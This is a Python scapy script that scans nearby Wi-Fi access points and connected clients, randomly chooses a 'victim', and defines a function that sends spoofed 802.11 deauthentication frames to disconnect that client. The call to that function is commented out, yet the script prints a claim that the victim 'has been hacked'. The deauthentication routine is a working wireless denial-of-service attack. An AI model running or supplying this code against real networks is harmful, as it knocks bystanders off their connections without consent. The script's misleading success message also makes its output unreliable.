from scapy.all import *
import os
import sys
import sys
import time
import random
import change_modes as modes


# Global Variables
with open("iface_name.txt", 'r') as file:
    iface = file.readline()
    
ap_list = list()
ssid_list = list()
users = list()


def AP_handler(pkt):
    global ap_list
    # Checking if the packets have a 802.11 layer
    if pkt.haslayer(Dot11):  # and pkt.type == 0 and pkt.subtype == 8:
        dot11_layer = pkt.getlayer(Dot11)
        if dot11_layer.addr2 and dot11_layer.addr2 not in ap_list and dot11_layer.payload.name != "NoPayload":
            ap_list.append(dot11_layer.addr2)
            ssid_list.append(dot11_layer.payload.name)
            print(f"{len(ap_list)}\t{ dot11_layer.addr2}\t{dot11_layer.payload.name}")


def users_handler(pkt):
    global users
    if pkt.addr2 not in ap_list and pkt.addr2 not in users and pkt.addr2 != "00:00:00:00:00:00":
        users.append(pkt.addr2)
        print(f"{len(users)}\t{pkt.addr2}")


def scan_wlan():
    print("\n\nScanning for access points...")
    print("index\tMAC\t\t\tSSID")
    sniff(iface=iface, count=0, prn=AP_handler, timeout=10)


def scan_for_users():
    print("\n\nScanning for users...")
    print("Index\tUser MAC")
    sniff(iface=iface, prn=users_handler, timeout=10)


def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
	# 802.11 frame
	# addr1: destination MAC , addr2: source MAC,  addr3: Access Point MAC
	dot11 = Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr)
	# stack them up
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	# send the packet
	sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)



# Main
scan_wlan()

print("\nAccess Points Captured:\n\n", '\n'.join(ap_list))
try:
    random_ap = random.choice(ap_list)
except:
    print("List of Access Points is empty!")
print(f"\nRandom chosen AP is: {random_ap}")

scan_for_users()

try:
    victim = random.choice(users)
except:
    print("List of Access Points is empty!")
print(f"\nRandom chosen victm is: {victim}")
print(f"\nVictim: {victim} has been hacked!!!")


#victim = "c0:e8:62:82:aa:dd"
#ap_mac_addr = "B4:EE:B4:A8:91:13"
#deauthenticate_victim(iface, victim, ap_mac_addr)





